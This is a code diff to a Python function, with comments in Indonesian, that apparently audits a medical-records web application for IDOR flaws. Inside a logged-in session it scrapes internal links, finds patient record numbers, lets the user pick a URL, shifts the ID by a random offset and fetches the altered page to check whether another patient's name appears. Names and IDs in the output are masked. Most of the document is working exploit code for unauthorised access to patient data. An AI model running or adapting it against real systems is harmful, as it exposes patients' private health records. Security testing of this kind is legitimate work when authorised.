@@ -142,53 +142,74 @@ def parameter_discovery_audit():
         soup = BeautifulSoup(res.text, 'html.parser')
         links = soup.find_all('a', href=True)
         
-        discovered_urls = []
+        # List untuk menyimpan data link: (url_asli, url_masked, id_rm)
         potential_targets = []
+        
         for link in links:
             href = link['href']
-            if href not in discovered_urls and "logout" not in href.lower() and href.startswith('http'):
-                discovered_urls.append(href)
-                match = re.search(r'/(\d{6,12})', href)
-                if match:
-                    potential_targets.append((href, match.group(1)))
-
-        if discovered_urls:
-            print(f"\n[+] Discovered {len(discovered_urls)} unique internal links:")
-            for d in discovered_urls:
-                print(f" [\033[93m!\033[0m] URL: {d}")
+            # Filter link internal dan hindari duplikat/logout
+            if any(x in href for x in ["index.php", "home"]) and "logout" not in href.lower():
+                if not any(href == x[0] for x in potential_targets):
+                    # Deteksi No RM (angka 6-12 digit)
+                    match = re.search(r'(\d{6,12})', href)
+                    id_rm = match.group(1) if match else None
+                    
+                    # Masking total untuk daftar (sembunyikan semua angka RM)
+                    masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), href)
+                    potential_targets.append((href, masked_url, id_rm))
 
         if potential_targets:
-            print(f"\n[*] Initiating Automated Manipulation Test on Path Variables...")
-            # 1. Randomization: Memilih satu target secara acak untuk diuji sebagai PoC
-            base_url, original_id = random.choice(potential_targets)
-            masked_original = "*" * (len(original_id) - 2) + original_id[-2:]
-            print(f"[*] Random PoC Target: {base_url.replace(original_id, masked_original)}")
+            print(f"\n[+] Discovered {len(potential_targets)} unique internal links:")
+            for i, target in enumerate(potential_targets):
+                print(f" [{i+1}] URL: {target[1]}")
             
-            # 2. Automated Manipulation Test
-            print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
+            # Pilihan Target oleh Pengguna
+            try:
+                choice_idx = int(input(f"\n[?] Pilih nomor URL untuk Manipulation Test (1-{len(potential_targets)}): ")) - 1
+                if choice_idx < 0 or choice_idx >= len(potential_targets):
+                    print("[!] Pilihan tidak valid, membatalkan test.")
+                    return
+                
+                base_url, _, original_id = potential_targets[choice_idx]
+                
+                if not original_id:
+                    print("[!] URL ini tidak memiliki parameter ID (No RM) untuk dimanipulasi.")
+                    return
+
+                # 1. Masking digit ke-3 dari belakang untuk PoC Target
+                # Contoh: 502013 -> ***0**
+                poc_mask = "*" * (len(original_id) - 3) + original_id[-3] + "**"
+                print(f"\n[*] Target Selected: {base_url.replace(original_id, poc_mask)}")
+                
+                # 2. Automated Manipulation Test
+                print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
+                
+                # Generate ID baru dengan offset acak
+                offset = random.choice([x for x in range(-50, 51) if x != 0])
+                test_id = str(int(original_id) + offset).zfill(len(original_id))
+                test_url = base_url.replace(original_id, test_id)
+                
+                test_res = session.get(test_url, timeout=10)
+                test_soup = BeautifulSoup(test_res.text, 'html.parser')
+                
+                # Masking 3 digit terakhir untuk hasil test
+                # Contoh: 502013 -> ***013
+                result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
+                
+                name_tag = test_soup.find('p', class_='sale-price text-success')
             
-            # Generate ID baru dengan offset acak
-            offset = random.choice([x for x in range(-100, 101) if x != 0])
-            test_id = str(int(original_id) + offset).zfill(len(original_id))
-            test_url = base_url.replace(original_id, test_id)
-            
-            test_res = session.get(test_url, timeout=10)
-            test_soup = BeautifulSoup(test_res.text, 'html.parser')
-            
-            # Mendeteksi apakah manipulasi berhasil (mencari tag nama pasien)
-            name_tag = test_soup.find('p', class_='sale-price text-success')
-            masked_test_id = "*" * (len(test_id) - 2) + test_id[-2:]
-            
-            if name_tag:
-                name = name_tag.get_text(strip=True)
-                masked_name = f"{name[:2].upper()}..{name[-2:].upper()}"
-                print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                print(f" [!] Manipulated ID : {masked_test_id}")
-                print(f" [!] Discovered Data: {masked_name}")
-                print(f" [!] Vulnerability  : \033[91mIDOR Confirmed\033[0m\n")
-            else:
-                print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {masked_test_id}.")
-                print(f" [!] Result         : No data extracted (Status: {test_res.status_code})\n")
+                if name_tag:
+                    name = name_tag.get_text(strip=True)
+                    masked_name = f"{name[:2].upper()}..{name[-2:].upper()}"
+                    print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                    print(f" [!] Manipulated ID : {result_mask}")
+                    print(f" [!] Discovered Data: {masked_name}")
+                    print(f" [!] Vulnerability  : \033[91mIDOR Confirmed\033[0m\n")
+                else:
+                    print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {result_mask}.")
+                    print(f" [!] Result         : No data extracted (Status: {test_res.status_code})\n")
+            except (ValueError, IndexError):
+                print("[!] Input harus berupa angka pilihan di atas.")
         else:
             print("[!] No obvious tamperable parameters found on the dashboard.")
     except Exception as e:
